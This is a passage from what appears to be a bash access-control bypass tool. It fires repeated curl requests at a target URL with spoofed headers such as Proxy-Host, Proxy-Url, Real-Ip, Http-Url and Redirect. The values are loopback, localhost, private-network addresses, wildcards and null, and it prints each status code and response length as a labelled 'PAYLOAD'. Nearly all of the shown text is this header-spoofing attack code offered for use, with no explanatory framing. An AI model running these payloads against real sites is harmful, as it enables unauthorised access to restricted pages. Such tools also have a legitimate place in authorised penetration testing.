	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Http-Url: 192.168.1.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Http-Url: 192.168.1.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	
	echo -n "Proxy-Host Payload: ${website_ip}"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Proxy-Host: ${website_ip}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Proxy-Host: ${website_ip}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Proxy-Host Payload: 127.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Proxy-Host: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Proxy-Host: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Proxy-Host Payload: *"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Proxy-Host: *" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Proxy-Host: *' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Proxy-Host Payload: 8.8.8.8"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Proxy-Host: 8.8.8.8" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Proxy-Host: 8.8.8.8' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Proxy-Host Payload: null"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Proxy-Host: null" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Proxy-Host: null' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Proxy-Host Payload: 192.168.0.2"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Proxy-Host: 192.168.0.2" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Proxy-Host: 192.168.0.2' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Proxy-Host Payload: 10.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Proxy-Host: 10.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Proxy-Host: 10.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Proxy-Host Payload: 0.0.0.0"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Proxy-Host: 0.0.0.0" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Proxy-Host: 0.0.0.0' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Proxy-Host Payload: localhost"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Proxy-Host: localhost" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Proxy-Host: localhost' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Proxy-Host Payload: 192.168.1.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Proxy-Host: 192.168.1.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Proxy-Host: 192.168.1.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"


	echo -n "Proxy-Url Payload: ${website_ip}"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Proxy-Url: ${website_ip}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Proxy-Url: ${website_ip}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Proxy-Url Payload: 127.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Proxy-Url: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Proxy-Url: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Proxy-Url Payload: *"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Proxy-Url: *" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Proxy-Url: *' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Proxy-Url Payload: 8.8.8.8"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Proxy-Url: 8.8.8.8" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Proxy-Url: 8.8.8.8' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Proxy-Url Payload: null"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Proxy-Url: null" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Proxy-Url: null' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Proxy-Url Payload: 192.168.0.2"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Proxy-Url: 192.168.0.2" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Proxy-Url: 192.168.0.2' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Proxy-Url Payload: 10.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Proxy-Url: 10.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Proxy-Url: 10.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Proxy-Url Payload: 0.0.0.0"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Proxy-Url: 0.0.0.0" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Proxy-Url: 0.0.0.0' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Proxy-Url Payload: localhost"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Proxy-Url: localhost" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Proxy-Url: localhost' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Proxy-Url Payload: 192.168.1.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Proxy-Url: 192.168.1.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Proxy-Url: 192.168.1.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"


	echo -n "Real-Ip Payload: ${website_ip}"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Real-Ip: ${website_ip}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Real-Ip: ${website_ip}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Real-Ip Payload: 127.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Real-Ip: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Real-Ip: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Real-Ip Payload: *"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Real-Ip: *" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Real-Ip: *' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Real-Ip Payload: 8.8.8.8"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Real-Ip: 8.8.8.8" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Real-Ip: 8.8.8.8' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Real-Ip Payload: null"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Real-Ip: null" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Real-Ip: null' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Real-Ip Payload: 192.168.0.2"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Real-Ip: 192.168.0.2" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Real-Ip: 192.168.0.2' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Real-Ip Payload: 10.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Real-Ip: 10.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Real-Ip: 10.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Real-Ip Payload: 0.0.0.0"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Real-Ip: 0.0.0.0" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Real-Ip: 0.0.0.0' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Real-Ip Payload: localhost"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Real-Ip: localhost" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Real-Ip: localhost' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Real-Ip Payload: 192.168.1.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Real-Ip: 192.168.1.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Real-Ip: 192.168.1.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"


	echo -n "Redirect Payload: ${website_ip}"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Redirect: ${website_ip}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Redirect: ${website_ip}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Redirect Payload: 127.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Redirect: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Redirect: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Redirect Payload: *"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Redirect: *" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Redirect: *' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Redirect Payload: 8.8.8.8"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Redirect: 8.8.8.8" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Redirect: 8.8.8.8' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Redirect Payload: null"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Redirect: null" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Redirect: null' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Redirect Payload: 192.168.0.2"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Redirect: 192.168.0.2" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Redirect: 192.168.0.2' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Redirect Payload: 10.0.0.1"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Redirect: 10.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Redirect: 10.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Redirect Payload: 0.0.0.0"
	code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Redirect: 0.0.0.0" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -ks -H 'Redirect: 0.0.0.0' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
    print
    [[ -n "$delay" ]] && sleep "$delay"

	echo -n "Redirect Payload: localhost"
